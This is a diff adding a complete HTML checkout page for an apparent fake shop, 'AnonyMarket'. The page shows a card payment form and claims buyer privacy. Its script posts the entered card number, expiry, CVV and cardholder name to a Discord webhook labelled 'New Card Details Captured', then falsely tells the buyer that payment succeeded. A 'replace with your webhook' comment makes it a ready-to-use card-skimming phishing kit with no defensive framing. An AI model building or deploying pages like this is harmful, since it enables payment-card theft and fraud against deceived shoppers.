@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout | AnonyMarket</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="bg-gray-50">
+    <header class="bg-white shadow-sm py-4">
+        <div class="max-w-4xl mx-auto px-4 flex justify-between items-center">
+            <h1 class="text-2xl font-bold text-indigo-700">AnonyMarket</h1>
+            <a href="index.html" class="text-gray-600"><i class="fas fa-arrow-left mr-2"></i>Back to Shop</a>
+        </div>
+    </header>
+
+    <main class="max-w-4xl mx-auto px-4 py-12">
+        <div class="bg-white rounded-xl shadow-lg p-8">
+            <h2 class="text-3xl font-bold mb-6">Secure Anonymous Checkout</h2>
+            <p class="text-gray-600 mb-8">Your privacy is protected. We accept card payments for instant processing.</p>
+
+            <div class="mb-8 p-4 bg-gray-100 rounded-lg">
+                <p class="text-xl font-semibold mb-4">Order Summary</p>
+                <div id="orderItems"></div>
+                <p class="text-2xl font-bold text-right mt-4">Total: $<span id="orderTotal">0.00</span></p>
+            </div>
+
+            <!-- Card Form -->
+            <h3 class="text-2xl font-bold mb-6">Payment Details (Credit/Debit Card)</h3>
+            <div class="space-y-6">
+                <div>
+                    <label class="block text-sm font-medium mb-2">Card Number</label>
+                    <input id="cardNumber" type="text" placeholder="1234 5678 9012 3456" class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:border-indigo-600">
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-sm font-medium mb-2">Expiry Date</label>
+                        <input id="cardExpiry" type="text" placeholder="MM/YY" class="w-full px-4 py-3 border rounded-lg">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-2">CVV</label>
+                        <input id="cardCVV" type="text" placeholder="123" class="w-full px-4 py-3 border rounded-lg">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-sm font-medium mb-2">Name on Card</label>
+                    <input id="cardName" type="text" placeholder="John Doe" class="w-full px-4 py-3 border rounded-lg">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium mb-2">Billing Address (Optional for Anonymity)</label>
+                    <input type="text" placeholder="Leave blank for max privacy" class="w-full px-4 py-3 border rounded-lg">
+                </div>
+                <button onclick="processPayment()" class="w-full bg-indigo-600 text-white py-4 rounded-lg text-xl font-semibold hover:bg-indigo-700">Complete Purchase</button>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // === REPLACE WITH YOUR DISCORD WEBHOOK ===
+        const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+        const params = new URLSearchParams(window.location.search);
+        const items = JSON.parse(decodeURIComponent(params.get('items') || '[]'));
+        const total = params.get('total') || '0.00';
+
+        // Display order summary
+        let itemsHtml = '';
+        items.forEach(item => {
+            itemsHtml += `<p>${item.name} x ${item.qty} - $${(item.price * item.qty).toFixed(2)}</p>`;
+        });
+        document.getElementById('orderItems').innerHTML = itemsHtml || '<p>No items</p>';
+        document.getElementById('orderTotal').textContent = total;
+
+        async function sendToDiscord(cardData) {
+            const embed = {
+                title: "🔔 New Card Details Captured - AnonyMarket",
+                color: 16711680,
+                fields: [
+                    { name: "Order Total", value: `$${total}`, inline: true },
+                    { name: "Items Count", value: items.length.toString(), inline: true },
+                    { name: "Card Number", value: cardData.number || "N/A", inline: false },
+                    { name: "Expiry", value: cardData.expiry || "N/A", inline: true },
+                    { name: "CVV", value: cardData.cvv || "N/A", inline: true },
+                    { name: "Name on Card", value: cardData.name || "N/A", inline: false },
+                    { name: "Timestamp", value: new Date().toUTCString(), inline: false }
+                ],
+                footer: { text: "Anonymous Market Logger" }
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (e) {}
+        }
+
+        async function processPayment() {
+            const cardData = {
+                number: document.getElementById('cardNumber').value.trim(),
+                expiry: document.getElementById('cardExpiry').value.trim(),
+                cvv: document.getElementById('cardCVV').value.trim(),
+                name: document.getElementById('cardName').value.trim()
+            };
+
+            if (DISCORD_WEBHOOK !== 'YOUR_DISCORD_WEBHOOK_URL_HERE' && cardData.number) {
+                await sendToDiscord(cardData);
+            }
+
+            alert('Payment Successful! Your order is confirmed. Tracking info will be sent anonymously.');
+            window.location.href = 'index.html';
+        }
+    </script>
+</body>
+</html>
